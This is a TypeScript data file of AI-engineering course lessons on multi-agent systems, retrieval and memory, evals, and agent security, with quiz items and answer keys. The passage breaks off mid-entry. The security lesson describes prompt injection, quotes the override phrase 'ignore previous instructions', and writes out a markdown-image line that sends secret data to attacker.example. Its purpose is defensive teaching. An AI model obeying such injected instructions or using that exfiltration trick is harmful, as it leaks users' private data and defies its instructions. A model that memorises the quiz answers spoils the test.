import type { Lesson } from "../types";

export const agentsPart2: Lesson[] = [
  // ------------------------------------------------------------------ MULTI-AGENT
  {
    id: "multi-agent",
    title: "Multi-Agent Systems & Orchestration",
    tagline: "Lead agents, parallel subagents, handoffs and agent-to-agent protocols, and when not to bother.",
    difficulty: "advanced",
    minutes: 15,
    diagram: {
      title: "An orchestrator-worker research system",
      nodes: [
        { id: "user", label: "User", kind: "client", x: 80, y: 280 },
        { id: "lead", label: "Lead agent", sub: "plans · delegates · synthesizes", kind: "model", x: 300, y: 280 },
        { id: "memory", label: "Plan & memory", sub: "survives context limits", kind: "storage", x: 300, y: 470 },
        { id: "sub1", label: "Subagent A", sub: "research angle 1", kind: "model", x: 570, y: 100 },
        { id: "sub2", label: "Subagent B", sub: "research angle 2", kind: "model", x: 570, y: 280 },
        { id: "sub3", label: "Subagent C", sub: "read & verify", kind: "model", x: 570, y: 460 },
        { id: "tools", label: "Search · fetch · tools", kind: "external", x: 840, y: 280 },
        { id: "citer", label: "Citation pass", kind: "model", x: 300, y: 90 },
        { id: "out", label: "Cited report", kind: "client", x: 80, y: 90 },
      ],
      edges: [
        { from: "user", to: "lead" },
        { from: "lead", to: "memory" },
        { from: "lead", to: "sub1" },
        { from: "lead", to: "sub2" },
        { from: "lead", to: "sub3" },
        { from: "sub1", to: "tools" },
        { from: "sub2", to: "tools" },
        { from: "sub3", to: "tools" },
        { from: "lead", to: "citer" },
        { from: "citer", to: "out" },
      ],
      flows: [
        {
          name: "Research a hard question",
          path: ["user", "lead", "memory", "lead", "sub1", "tools", "sub1", "lead", "sub2", "lead", "citer", "out"],
          steps: [
            "“Compare the top vector databases for a 1-billion-vector workload.” The lead agent decides the approach and how much effort the question deserves.",
            "It saves the plan to memory first, so the plan survives even if the lead's own context later overflows.",
            "Plan stored: four research angles, each with an objective, an output format, allowed tools and boundaries.",
            "Subagents launch in parallel, each with a fresh context (one path highlighted). Vague briefs ('research vector DBs') cause duplicated work, so each gets a crisp one.",
            "Each subagent runs its own search loop: broad queries first, then narrower ones, judging source quality as it goes.",
            "Dozens of pages are read: tens of thousands of tokens that never enter the lead's context.",
            "It returns a condensed finding (a few hundred tokens) with sources.",
            "The lead reviews the findings, spots a gap (pricing at scale) and spawns a follow-up subagent.",
            "The gap is filled.",
            "The lead writes the synthesis, then a citation pass attaches a source to every claim.",
            "The cited report is delivered. This architecture uses many times the tokens of a chat, so reserve it for questions worth it.",
          ],
        },
        {
          name: "Context isolation",
          path: ["sub3", "tools", "sub3", "lead"],
          steps: [
            "Subagent C opens a dozen documents to verify a benchmark claim.",
            "~100k tokens of raw content stay inside C's own context window.",
            "Only “Confirmed in 2 independent sources; a third disagrees on methodology” returns. The lead's context stays clean for synthesis.",
          ],
        },
      ],
    },
    concept: `
## Why more than one agent?
A single agent has one context window and works sequentially. Multi-agent designs split work across several model loops:
- **Parallelism**: explore many directions at once (research, broad searches, independent subtasks).
- **Context isolation**: each subagent burns its own window on raw material and returns a compressed result, so the coordinator's context stays clean.
- **Specialization**: different prompts, tools, permissions or even models per role (a cheap fast model for searching, a strong one for synthesis).
- **Scale of effort**: in published research systems, more total tokens spent across agents strongly predicted better answers on hard, breadth-first questions.

## Common architectures
- **Orchestrator-workers / lead + subagents** (the diagram): one agent plans and delegates, workers execute and report back. Most production multi-agent systems look like this.
- **Handoffs**: control passes from one specialized agent to another (triage → billing → technical), carrying the conversation. Common in customer-facing systems.
- **Pipelines**: fixed stages, each an agent (research → draft → review). Really a workflow.
- **Debate / critique**: agents argue or review each other to improve accuracy.
- **Agent-to-agent protocols** (e.g. A2A): agents from different vendors or teams discover each other's capabilities ("agent cards") and exchange tasks over a standard interface. This complements MCP, which connects agents to tools.

## The costs and failure modes
- **Tokens**: agents use several times more tokens than chat, and multi-agent systems use several times more again. Published research systems report roughly an order of magnitude more than a chat. Only worth it for high-value tasks.
- **Coordination**: vague delegation causes duplicated or missed work. Workers make conflicting assumptions (two subagents pick different libraries). Errors compound across hand-offs (the telephone game).
- **Shared context**: actions carry implicit decisions. A worker that can't see why the lead chose an approach may undo it, which is why some teams argue that **tightly coupled work, such as coding, should stay single-threaded** with good compaction rather than being split.
- **Debugging and evals**: non-deterministic interactions between agents are hard to reproduce, so you need full tracing and end-state evaluation.

## Making it work (lessons from production systems)
1. **Teach the orchestrator to delegate**: each subtask gets an objective, an output format, tool guidance and clear boundaries.
2. **Scale effort to the query**: simple fact → one agent, a few tool calls. Complex comparison → many subagents.
3. **Parallelize tool calls** inside agents, and run subagents concurrently. This cuts wall-clock time dramatically.
4. **Persist plans and memory** outside the context window, and summarize completed phases.
5. **Prefer read-heavy parallel work** (search, analysis, review). Keep write-heavy, interdependent work in one agent.
6. **Evaluate end states** (was the report correct and well-sourced?) rather than exact step sequences, and use LLM judges with rubrics plus human spot checks.
`,
    keyPoints: [
      "Multi-agent buys parallelism, context isolation and specialization.",
      "Most production systems are orchestrator + subagents, or sequential handoffs.",
      "Cost: many times more tokens. Use it for high-value, breadth-first tasks.",
      "Failure modes: vague delegation, conflicting decisions, compounding errors, hard debugging.",
      "Keep tightly coupled (write-heavy) work single-agent. Parallelize read-heavy work.",
      "A2A connects agents to agents. MCP connects agents to tools.",
    ],
    code: [
      {
        title: "Lead agent fanning out to subagents",
        variants: [
          {
            lang: "python",
            code: `
import asyncio, json

SUBAGENT_SYSTEM = """You are a research subagent. Complete ONLY your assigned objective.
Return JSON: {"findings": [...], "sources": [...], "open_questions": [...]}. Max 300 words."""

async def run_subagent(brief: dict) -> dict:
    # fresh context: the subagent never sees the lead's history, only its brief
    result = await agent_loop(system=SUBAGENT_SYSTEM, tools=[web_search, fetch_page],
                              user=json.dumps(brief), max_turns=15)
    return json.loads(result)

async def lead(question: str) -> str:
    plan = await llm_json(f"""Break this question into 2-5 independent research briefs.
Each brief: objective, output_format, suggested_queries, out_of_scope.
Use 1 brief for simple fact lookups.\\n\\nQuestion: {question}""")
    save_memory("plan", plan)                       # survives context compaction

    findings = await asyncio.gather(*(run_subagent(b) for b in plan["briefs"]))
    gaps = await llm_json(f"Given these findings, list missing info (or []):\\n{findings}")
    if gaps:
        findings += await asyncio.gather(*(run_subagent(g) for g in gaps[:3]))

    report = await llm(f"Write a sourced answer to: {question}\\n\\nFindings:\\n{findings}")
    return await add_citations(report, findings)
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "When does a multi-agent architecture beat a single agent, and when doesn't it?",
        a: "It wins on **breadth-first, parallelizable, read-heavy** tasks where the information exceeds one context window: research across many sources, large-scale search and analysis, reviewing many files independently. There, subagents explore in parallel with isolated contexts and return condensed results, and more total compute buys better answers. It loses on **tightly coupled** tasks where every step depends on shared decisions (most coding edits, careful writing): splitting causes conflicting assumptions and lost context, and costs many times more tokens and coordination latency. Default to one agent with good context management, and add agents when evals show breadth helps.",
        freq: "common",
      },
      {
        q: "How do you prevent subagents from duplicating work or contradicting each other?",
        a: "Give each subagent a precise brief: objective, scope boundaries (what *not* to cover), expected output format, suggested tools and sources, and an effort budget. Have the orchestrator assign non-overlapping slices, and share key decisions or constraints explicitly in every brief. Prefer subagents that **report findings** rather than take conflicting actions, and keep writes centralized in the lead. Review results for gaps and conflicts before synthesis, spawn targeted follow-ups, and trace every subagent so you can see when instructions were ambiguous.",
        freq: "common",
      },
      {
        q: "What's the difference between MCP and A2A?",
        a: "**MCP** standardizes how an AI application connects to **tools, data and prompts**: the agent is the client, and servers expose capabilities it can call. **A2A** (agent-to-agent) standardizes how **autonomous agents talk to each other** as peers: discovering another agent's capabilities via an agent card, sending it tasks, exchanging messages and artifacts, and tracking long-running task status, even across vendors. An agent might use MCP to reach its own tools and A2A to delegate a whole task to another organization's agent.",
        freq: "occasional",
      },
    ],
    quiz: [
      {
        q: "The main reason subagents help with research is…",
        options: ["They're cheaper", "Parallel exploration with isolated contexts", "They never hallucinate", "They share one context"],
        answer: 1,
        explain: "Raw material stays in their windows, and only summaries return.",
      },
      {
        q: "Which task is the worst fit for splitting across many agents?",
        options: ["Surveying 50 sources", "Reviewing 30 independent files", "A tightly coupled refactor of one module", "Searching many angles of a question"],
        answer: 2,
        explain: "Coupled edits need shared decisions and context.",
      },
      {
        q: "Compared with a single chat, a multi-agent research system typically uses…",
        options: ["Fewer tokens", "About the same", "Many times more tokens", "No tokens for subagents"],
        answer: 2,
        explain: "Worth it only for high-value tasks.",
      },
      {
        q: "A2A primarily connects…",
        options: ["Agents to databases", "Agents to other agents", "GPUs to each other", "Users to models"],
        answer: 1,
        explain: "MCP connects agents to tools and data.",
      },
    ],
  },

  // ------------------------------------------------------------------ RETRIEVAL + MEMORY
  {
    id: "agentic-retrieval",
    title: "Agentic Retrieval & Memory",
    tagline: "Hybrid search, reranking, contextual retrieval, agentic search, and memory that persists across sessions.",
    difficulty: "intermediate",
    minutes: 16,
    visualizers: ["hybrid"],
    concept: `
## Beyond basic RAG
Neural Citadel covers the basic RAG pipeline (chunk → embed → index → retrieve → generate). Production systems add four upgrades:

**1. Hybrid search (try the lab).** Dense embeddings capture meaning and paraphrase. Keyword search (**BM25**) nails exact terms: error codes, product names, IDs. Run both and fuse the lists with **reciprocal rank fusion**: score(d) = Σ 1/(k + rank(d)), with k ≈ 60 by convention. RRF needs no score normalization between incompatible scoring systems.

**2. Reranking.** Retrievers are *bi-encoders* (query and document embedded separately, fast at scale). A **cross-encoder reranker** reads query and document together and scores relevance precisely: too slow for millions of documents, ideal for re-ordering the top 20–100. It's usually the cheapest big quality win.

**3. Better chunks.** Chunks lose their surroundings: "Revenue grew 3%" means nothing without the company and quarter. **Contextual retrieval** prepends a short LLM-generated context to each chunk before embedding and BM25 indexing (cheap with prompt caching). Anthropic reported it cut failed retrievals by about half, and by about two thirds combined with reranking. Related ideas: late chunking, multi-vector / late interaction (ColBERT), parent-document retrieval (search small chunks, return the larger section).

**4. Query-side tricks.** Rewrite the query, decompose multi-part questions, generate a hypothetical answer and search with that (HyDE), filter by metadata (date, product, permissions).

## Agentic retrieval
Instead of one retrieval step before generation, let the model **decide when and how to search**: issue queries, read results, refine, follow links, combine sources (SQL, grep, vector search, web, APIs) and stop when it has enough. It's slower and costlier, but it handles multi-hop questions and ambiguity far better.
- **Coding agents often skip vector indexes entirely** and use agentic search (grep, glob, read) over the live repo: always fresh, exact and explainable.
- **GraphRAG** builds an entity-relationship graph with community summaries, which helps "global" questions ("what are the main themes across these 10,000 tickets?") where chunk retrieval fails.
- **Long context vs RAG**: if the whole corpus fits comfortably (and caches), just include it. Retrieve when it doesn't, when it changes constantly, or when permissions differ per document.

## Memory for agents
| Type | What | Example implementation |
|---|---|---|
| **Working** | The current context window | Messages, tool results |
| **Episodic** | What happened before | Searchable past conversations or task logs |
| **Semantic** | Facts about the user or world | A profile store, key-value facts, a knowledge graph |
| **Procedural** | How to do things | Memory files (CLAUDE.md / AGENTS.md), skills, learned instructions |
Design questions: **what to write** (explicit "remember this", extracted facts, the agent's own notes), **when to read** (always loaded vs retrieved on demand), **updates and conflicts** (newer facts override, with timestamps), **forgetting** (TTL, decay, user deletion), and **privacy** (users can see and erase memories; per-tenant isolation). Memory is also an attack surface: injected content saved as a "memory" persists across sessions.

## Evaluate retrieval separately
Measure **recall@k** and **MRR / nDCG** on a labeled query set *before* judging generated answers. If the right passage never reaches the context, no prompt can fix it. Then measure answer faithfulness (claims supported by the retrieved sources) and citation accuracy.
`,
    keyPoints: [
      "Hybrid = BM25 + dense, fused with RRF: Σ 1/(k + rank), k ≈ 60.",
      "Cross-encoder reranking of the top candidates is a cheap, big precision win.",
      "Contextual retrieval prepends chunk-specific context before indexing.",
      "Agentic retrieval: the model searches iteratively across tools, and handles multi-hop questions.",
      "Memory types: working, episodic, semantic, procedural. Design write/read/forget/privacy.",
      "Measure retrieval (recall@k) separately from answer quality.",
    ],
    code: [
      {
        title: "Hybrid retrieval with RRF and a reranker",
        variants: [
          {
            lang: "python",
            code: `
def rrf(rankings: list[list[str]], k: int = 60) -> list[str]:
    """Reciprocal rank fusion: robust to incompatible score scales."""
    scores: dict[str, float] = {}
    for ranking in rankings:
        for rank, doc_id in enumerate(ranking, start=1):
            scores[doc_id] = scores.get(doc_id, 0.0) + 1.0 / (k + rank)
    return sorted(scores, key=scores.get, reverse=True)

def retrieve(query: str, user, top_n=8):
    allowed = {"tenant_id": user.tenant_id}                    # enforce permissions in the query
    keyword = bm25_index.search(query, filters=allowed, k=50)
    dense = vector_index.search(embed(query), filters=allowed, k=50)
    candidates = rrf([keyword, dense])[:40]
    scored = reranker.score(query, [docs[d].text for d in candidates])   # cross-encoder
    best = [d for d, _ in sorted(zip(candidates, scored), key=lambda x: -x[1])][:top_n]
    return [docs[d] for d in best]

def contextualize(chunk: str, document: str) -> str:
    """Contextual retrieval: situate each chunk before indexing (cache the document prefix)."""
    ctx = llm(f"<document>{document}</document>\\nGive 1-2 sentences situating this chunk "
              f"within the document for search retrieval:\\n<chunk>{chunk}</chunk>")
    return f"{ctx}\\n\\n{chunk}"
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "Your RAG system misses answers for queries containing product codes. What do you do?",
        a: "Dense embeddings blur exact tokens like `E-4012` or SKU numbers. Add **keyword search (BM25)** and fuse it with the vector results (**hybrid search** with reciprocal rank fusion), make sure the tokenizer and analyzer keep codes intact, consider metadata filters or an exact-match lookup path for ID-shaped queries, and add a **reranker** over the fused candidates. Then measure recall@k on a labeled set of such queries to confirm the fix, rather than eyeballing.",
        freq: "very-common",
      },
      {
        q: "What is a reranker and why use one?",
        a: "Retrieval models are bi-encoders: queries and documents are embedded independently, so search is fast over millions of items but relevance is approximate. A **cross-encoder reranker** takes the query and one candidate together and outputs a relevance score using full attention between them, which is much more accurate but too expensive to run over the whole corpus. So: retrieve the top 50–100 cheaply (hybrid), rerank, keep the top 5–10 for the prompt. It improves precision, reduces irrelevant context (and context rot) and is usually the most cost-effective quality boost.",
        freq: "common",
      },
      {
        q: "How would you give an assistant long-term memory of users?",
        a: "Decide memory types: **semantic** facts (preferences, profile), **episodic** history (past conversations, searchable), and **procedural** instructions. **Write path**: extract candidate facts after conversations (or on explicit 'remember this'), deduplicate, timestamp, attribute the source, and resolve conflicts (newer wins, or ask). **Read path**: always load a small profile, and retrieve relevant episodes on demand with hybrid search. Add **forgetting** (TTLs, decay) and user controls to view and delete memories, isolate by tenant and user, never store secrets, and defend against injected 'memories' from untrusted content. Evaluate with tasks that require recalling earlier sessions.",
        freq: "common",
      },
      {
        q: "Why might a coding agent use grep instead of a vector index?",
        a: "Codebases change constantly, so an embedding index goes stale and needs re-indexing infrastructure. Code questions are often about exact symbols, where grep and glob are precise. An agent can iterate (search, read, refine) just like a developer, the results are explainable, and there's no chunking problem splitting functions apart. The cost is more tool calls and tokens per search, which modern models handle well. Vector search still helps for fuzzy natural-language questions over huge or unfamiliar codebases, and some tools combine both.",
        freq: "occasional",
      },
    ],
    quiz: [
      {
        q: "RRF score for a document ranked 1st by BM25 and 3rd by vectors (k=60)?",
        options: ["1/61 + 1/63", "1/1 + 1/3", "61 + 63", "(1 + 3)/60"],
        answer: 0,
        explain: "Σ 1/(k + rank) over the lists.",
      },
      {
        q: "Cross-encoder rerankers are used on…",
        options: ["The whole corpus", "The top few dozen candidates", "Only the query", "Embeddings offline"],
        answer: 1,
        explain: "They're accurate but too slow for the full corpus.",
      },
      {
        q: "Contextual retrieval improves chunks by…",
        options: ["Making them shorter", "Prepending LLM-generated context about where the chunk sits", "Removing stop words", "Translating them"],
        answer: 1,
        explain: "A chunk without its surroundings loses meaning.",
      },
      {
        q: "Facts like 'the user prefers metric units' are which memory type?",
        options: ["Working", "Episodic", "Semantic", "Procedural"],
        answer: 2,
        explain: "Episodic = events, procedural = how-to, working = the current context.",
      },
      {
        q: "If the right passage never reaches the context, the fix is in…",
        options: ["The prompt wording", "Retrieval (measure recall@k)", "Temperature", "max_tokens"],
        answer: 1,
        explain: "Generation can't use what retrieval missed.",
      },
    ],
  },

  // ------------------------------------------------------------------ EVALS
  {
    id: "llm-evals",
    title: "Evals, Benchmarks & Eval Harnesses",
    tagline: "If you can't measure it you can't ship it: graders, LLM judges, agent evals and statistics.",
    difficulty: "intermediate",
    minutes: 17,
    visualizers: ["evals"],
    concept: `
## Why evals are the core skill
LLM outputs are non-deterministic, and a prompt tweak, a model upgrade or a new tool can silently break things that used to work. **Evals are the unit tests of AI systems**: a dataset of inputs plus a way to grade outputs, run on every change. Teams that ship reliable AI products write evals before (or alongside) prompts.

## Graders, from most to least reliable
1. **Code-based**: exact match, regex, JSON-schema validity, unit tests passing, final database state, numeric tolerance. Fast, cheap, objective. Use them wherever possible.
2. **LLM-as-judge**: a model scores outputs against a **rubric** (specific, binary or low-scale criteria) or compares two outputs **pairwise**. It scales well, but it has biases: **position** (prefers the first answer), **verbosity** (prefers longer answers), **self-preference** (prefers its own model family). Mitigate by swapping order, giving clear rubrics with examples, using a different model family, and **calibrating against human labels** (measure agreement).
3. **Human evaluation**: the gold standard for subjective quality, but slow and expensive. Use it to build and calibrate the other two.
Plus **online signals** in production: thumbs up/down, edits to drafts, task completion, escalation rate, retention, plus **A/B tests**.

## Building an eval set
Start from **real traffic** and real failures, add edge cases, adversarial inputs and every bug you fix (regression cases). Keep a **held-out** set you don't tune on. Even 50–200 good examples beat no evals. **Error analysis** comes first: read transcripts, categorize failures, then write evals for the categories that matter.

## Evaluating agents
- **Outcome over path**: grade the final state (tests pass, ticket resolved, database correct), since many paths are valid. Also check trajectories for unsafe or wasteful steps.
- **Environments**: real or simulated tools, often in containers, and simulated users for conversational agents.
- **Reliability**: run each task several times. **pass@k** (any success) fits retryable tasks; **pass^k** (all succeed) fits customer-facing consistency (see the lab).
- **Cost and latency** are metrics too: tokens, tool calls and wall-clock time per task.

## Public benchmarks (know what they measure)
| Benchmark | Measures |
|---|---|
| MMLU / MMLU-Pro | Broad knowledge (largely saturated) |
| GPQA Diamond | Graduate-level, "Google-proof" science questions |
| AIME and other math competitions | Multi-step math reasoning |
| Humanity's Last Exam | Very hard expert questions across fields |
| SWE-bench Verified | Fixing real GitHub issues (500 human-validated tasks, graded by repo tests) |
| Terminal-Bench | Agentic tasks in a terminal |
| τ-bench / τ²-bench | Tool-using customer-service agents with simulated users (pass^k) |
| OSWorld / WebArena | Computer and web use |
| ARC-AGI | Novel abstract reasoning |
| LMArena | Crowd-sourced human preference (Elo) |
Caveats: **contamination** (test data leaked into training), **saturation**, harness and prompt differences between reported numbers, and **statistical noise**: a 500-item benchmark has about a ±4-point 95% interval around 70%. A benchmark is not your use case, and your own evals decide.

## Eval harnesses
The code that runs the evaluation: load the dataset → run the model or agent (with tools, sandboxes, simulated users) → grade → log transcripts and scores. Open-source examples: **lm-evaluation-harness** (EleutherAI), **HELM** (Stanford), **Inspect** (UK AI Security Institute), **OpenAI Evals**, **promptfoo**, and the **SWE-bench harness**, which builds a Docker image per task and runs the repo's tests. Commercial platforms add dataset management, dashboards and online evals. Wire your eval suite into **CI** so prompt and model changes are gated like code.
`,
    keyPoints: [
      "Evals = dataset + grader, run on every prompt, model or tool change (CI).",
      "Prefer code-based graders. Calibrate LLM judges against human labels and watch their biases.",
      "Build eval sets from real traffic, failures and regressions, and keep a held-out set.",
      "Agents: grade outcomes, run multiple trials (pass@k vs pass^k), and track cost and latency.",
      "Benchmarks: know what they measure, beware contamination, saturation and noise.",
      "Eval harnesses run model → environment → grader → logs.",
    ],
    code: [
      {
        title: "A small eval harness with code and LLM graders",
        variants: [
          {
            lang: "python",
            code: `
import json, statistics

CASES = [json.loads(line) for line in open("evals/support.jsonl")]   # {input, expected, rubric, tags}

def grade_code(case, output):
    checks = [case["expected"]["must_mention"].lower() in output.lower(),
              "refund" not in output.lower() or case["expected"]["refund_allowed"]]
    return all(checks)

def grade_llm(case, output):
    verdict = judge(f"""Rubric (answer PASS or FAIL, then one sentence why):
{case['rubric']}

Customer message: {case['input']}
Assistant reply: {output}""")
    return verdict.strip().upper().startswith("PASS")

def run_suite(system_under_test, trials=3):
    rows = []
    for case in CASES:
        results = [system_under_test(case["input"]) for _ in range(trials)]   # the model is random too
        passed = [grade_code(case, r) and grade_llm(case, r) for r in results]
        rows.append({"id": case["id"], "pass_at_1": statistics.mean(passed), "pass_all": all(passed), "tags": case["tags"]})
    score = statistics.mean(r["pass_at_1"] for r in rows)
    consistent = statistics.mean(r["pass_all"] for r in rows)
    print(f"pass@1 {score:.1%}   pass^{trials} {consistent:.1%}   n={len(rows)}")
    return rows

# In CI: fail the build if the score drops more than the noise band below the last release
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "How would you evaluate an LLM-powered feature before and after launch?",
        a: "**Before**: do error analysis on real or realistic inputs, then build an eval set (typical cases, edge cases, adversarial cases, known failures) with graders: code-based checks wherever possible (schema validity, exact facts, tests), LLM-as-judge with specific rubrics calibrated against a human-labeled sample, and human review for subjective quality. Run multiple trials per case, track quality, cost and latency, and gate prompt and model changes in CI with statistically meaningful thresholds. **After**: online metrics (task success, thumbs, edits, escalations, retention), A/B tests for changes, sampling of production transcripts for review, monitoring for drift, and turning every incident into a new regression case.",
        freq: "very-common",
      },
      {
        q: "What are the pitfalls of LLM-as-a-judge?",
        a: "Biases: **position** (favors whichever answer comes first in pairwise comparisons), **verbosity** (favors longer, more confident answers), **self-preference** (favors outputs from its own model family), and leniency or inconsistency on vague criteria. It can also miss factual errors it doesn't know about. Mitigations: specific binary criteria rather than 1–10 vibes, rubrics with examples, swapping order and averaging, using a strong judge from a different family, having it reason before the verdict, and above all **measuring agreement with human labels** on a sample before trusting it, then re-checking periodically.",
        freq: "common",
      },
      {
        q: "How do you evaluate an AI agent, as opposed to a single LLM response?",
        a: "Put it in an **environment** with real or simulated tools and, for conversational agents, a simulated user; give it tasks with verifiable **end states** (tests pass, the right record changed, the correct refund issued) and grade the outcome rather than the exact path. Run each task several times and report both success rate and consistency (**pass^k**), because users experience variance. Track cost, tool calls, turns and latency per task, and inspect trajectories for unsafe actions (policy violations, unnecessary destructive commands). Read failed transcripts to find root causes in prompts, tools or the harness.",
        freq: "common",
      },
      {
        q: "Model B beats model A by 1.5 points on a 300-question benchmark. Ship B?",
        a: "Not on that alone. With 300 items the 95% confidence interval on each score is roughly ±5 points, so a 1.5-point gap is well within noise. Check whether the comparison is paired (same items, same harness and prompts), run multiple trials, look at per-category results and at the evals that represent *your* workload, compare cost and latency, and check for contamination. If it matters, enlarge the eval set or run an online A/B test with your real success metric.",
        freq: "common",
      },
    ],
    quiz: [
      {
        q: "Which grader is most reliable when applicable?",
        options: ["LLM judge 1–10 score", "Code-based checks (tests, schema, exact match)", "Asking the model if it's correct", "Response length"],
        answer: 1,
        explain: "Objective, cheap and reproducible.",
      },
      {
        q: "An LLM judge consistently prefers the first answer shown. This is…",
        options: ["Verbosity bias", "Position bias", "Contamination", "Overfitting"],
        answer: 1,
        explain: "Swap the order and average.",
      },
      {
        q: "A customer-service agent must behave correctly every time. Report…",
        options: ["pass@k", "pass^k", "Perplexity", "BLEU"],
        answer: 1,
        explain: "All k trials must succeed.",
      },
      {
        q: "SWE-bench Verified grades by…",
        options: ["Human preference", "Running the repository's tests after the agent's patch", "BLEU vs a reference patch", "LLM judge"],
        answer: 1,
        explain: "An execution-based outcome check per task.",
      },
      {
        q: "Benchmark questions leaking into training data is called…",
        options: ["Saturation", "Contamination", "Distillation", "Calibration"],
        answer: 1,
        explain: "It inflates scores without real capability.",
      },
    ],
  },

  // ------------------------------------------------------------------ SECURITY
  {
    id: "agent-security",
    title: "Prompt Injection, Guardrails & Agent Security",
    tagline: "Why LLMs can't separate instructions from data, and the architectures that keep agents safe anyway.",
    difficulty: "advanced",
    minutes: 16,
    visualizers: ["injection"],
    concept: `
## The core problem
An LLM sees one stream of tokens. System instructions, the user's request, a web page, an email and a tool result all arrive as text, and **the model has no reliable way to know which text is allowed to give orders**. Anything an agent reads can try to steer it.
- **Direct prompt injection / jailbreaks**: the user tries to override the rules (role-play, "ignore previous instructions", encodings, many-shot examples).
- **Indirect prompt injection**: instructions hidden in content the agent processes: web pages, emails, documents, code comments, issue text, tool descriptions, even images. The user is the victim, not the attacker.

## The lethal trifecta (try the lab)
An agent is exploitable for data theft when it combines all three:
1. **Access to private data** (files, email, databases, secrets),
2. **Exposure to untrusted content** (anything an attacker can influence),
3. **A way to communicate externally** (send email, make HTTP requests, post comments, even render a markdown image whose URL carries data).
Remove any one leg and that class of attack dies. Probabilistic defenses only lower the odds, and attackers retry until they win.

## Defense in depth
**Structural (reliable):**
- **Least privilege**: give each agent only the tools and scopes its task needs. Use per-user credentials, short-lived and scoped. Never let the agent hold admin keys.
- **Sandboxing**: filesystem and network isolation, egress allow-lists, no production secrets inside the sandbox.
- **Deterministic policy on actions**: allow-lists for recipients and domains, spending limits, schema validation, and rate limits enforced in code by the harness.
- **Human approval** for irreversible or external actions, with clear diffs of what will happen (and watch out for approval fatigue).
- **Isolation patterns**: the **dual-LLM** pattern and **CaMeL**-style designs. A quarantined model processes untrusted content and only returns constrained values, while a privileged planner that never sees raw untrusted text decides actions, so capabilities flow from the user's request.
**Probabilistic (helpful, not sufficient):**
- **Spotlighting**: delimit or encode untrusted content and instruct the model to treat it as data.
- **Classifiers** for injection and jailbreak attempts on inputs and tool results, and output classifiers for harmful content or data leakage.
- **Model-level robustness** from safety training.

## The rest of the threat model (OWASP Top 10 for LLM apps)
- **Sensitive information disclosure**: PII and secrets in prompts, logs or training data. Redact, minimize, encrypt, and set retention policies.
- **Improper output handling**: model output treated as trusted code, SQL, HTML or shell. Escape, parameterize and validate, like any untrusted input.
- **Excessive agency**: too many tools, permissions or autonomy for the task.
- **System prompt leakage**: assume your system prompt will be extracted, and never put secrets in it.
- **Supply chain**: malicious models, packages, MCP servers. Hallucinated package names registered by attackers ("slopsquatting") target coding agents.
- **Data and memory poisoning**: injected content stored in long-term memory or indexed for RAG.
- **Unbounded consumption**: runaway loops, huge contexts and denial-of-wallet attacks. Set budgets and rate limits.
- **Misinformation / hallucination**: ground answers in sources, allow "I don't know", and verify critical claims.

## Operational practice
Red-team before launch (manual + automated attack suites), log every tool call with inputs and outputs, alert on anomalous actions, keep kill switches (disable a tool or feature flag instantly), and run incident response like any security program.
`,
    keyPoints: [
      "LLMs can't reliably distinguish instructions from data: any text can steer them.",
      "Indirect injection hides instructions in content the agent reads.",
      "Lethal trifecta: private data + untrusted content + an exfiltration channel. Break one leg.",
      "Structural defenses (least privilege, sandbox, code-enforced policy, approvals, isolation) beat probabilistic ones.",
      "Treat model output as untrusted: escape, parameterize, validate.",
      "Budget agents to prevent runaway cost, and log, red-team and keep kill switches.",
    ],
    code: [
      {
        title: "Enforce policy in the harness, not in the prompt",
        variants: [
          {
            lang: "python",
            code: `
from urllib.parse import urlparse

ALLOWED_EMAIL_DOMAINS = {"acme.com"}
ALLOWED_FETCH_HOSTS = {"docs.acme.com", "status.acme.com"}

def guard_tool_call(name: str, args: dict, session) -> str | None:
    """Return a refusal string to block the call, or None to allow it. Runs for EVERY call."""
    if name == "send_email":
        domain = args["to"].rsplit("@", 1)[-1].lower()
        if domain not in ALLOWED_EMAIL_DOMAINS and args["to"] not in session.user.contacts:
            return "Blocked: recipient is not in your organization or contacts."
        if session.read_untrusted_content:          # trifecta check: tainted session + outbound channel
            if not session.ask_user(f"Send email to {args['to']}?\\n\\n{args['body'][:500]}"):
                return "User declined."
    if name == "fetch_url" and urlparse(args["url"]).hostname not in ALLOWED_FETCH_HOSTS:
        return "Blocked: host not on the allow-list."      # also stops data-in-URL exfiltration
    if name == "run_sql" and not args["query"].lstrip().lower().startswith("select"):
        return "Blocked: this agent has read-only database access."
    return None

def render_markdown_safely(text: str) -> str:
    # images and links to arbitrary hosts can exfiltrate data via the URL: strip or proxy them
    return strip_external_images(text)
`,
          },
        ],
      },
    ],
    interview: [
      {
        q: "What is prompt injection, and why is it so hard to fix?",
        a: "An attack where text supplied by someone other than the developer or user (directly, or indirectly inside content the model processes: web pages, emails, documents, tool outputs) contains instructions that the model follows. It's hard because LLMs process instructions and data in the same token stream, with no hard boundary like parameterized SQL. Training and classifiers make models more resistant, but they're probabilistic, and an attacker only needs one success while you need to block every variant. So robust systems assume the model *can* be manipulated and limit what a manipulated model can do.",
        freq: "very-common",
      },
      {
        q: "Explain the 'lethal trifecta' and how you'd design around it.",
        a: "An agent that has (1) access to private data, (2) exposure to untrusted content, and (3) the ability to communicate externally can be tricked by injected instructions into sending private data to an attacker. Design so no single agent context holds all three: remove external communication from agents that read untrusted content (or restrict it to allow-listed destinations enforced in code), require human approval for outbound actions after untrusted content has been read (taint tracking), split work so a quarantined component processes untrusted text and returns only constrained data to a privileged planner (dual-LLM / CaMeL), and avoid exfiltration side channels like auto-rendered images and link previews.",
        freq: "common",
      },
      {
        q: "How would you secure an AI agent that can take actions in production systems?",
        a: "**Least privilege**: dedicated identity per agent, scoped short-lived credentials acting on behalf of the specific user, a minimal toolset. **Policy enforcement in code**: schemas, allow-lists, limits (amounts, rates, recipients), read-only by default. **Human approval** for destructive, financial or external actions, with clear previews. **Sandboxing and egress controls**, and **no secrets** in prompts or context. Treat all tool output and retrieved content as **untrusted**. **Validate and escape model output** before using it as code, SQL or HTML. **Budgets** on turns, tokens and spend. Comprehensive **audit logs**, anomaly alerts and kill switches. **Red-teaming** before launch and continuously.",
        freq: "common",
      },
      {
        q: "How can an agent leak data through a markdown image?",
        a: "If the chat UI auto-renders markdown, an injected instruction can make the model output something like `![](https://attacker.example/log?d=<secret data>)`. The user's browser fetches that URL to display the image, sending the data to the attacker with no click needed. Defenses: don't render images from arbitrary domains (allow-list or proxy them), strip or rewrite URLs in model output, use a content security policy on the chat UI, and treat any outbound request triggered by model output as an exfiltration channel in your threat model.",
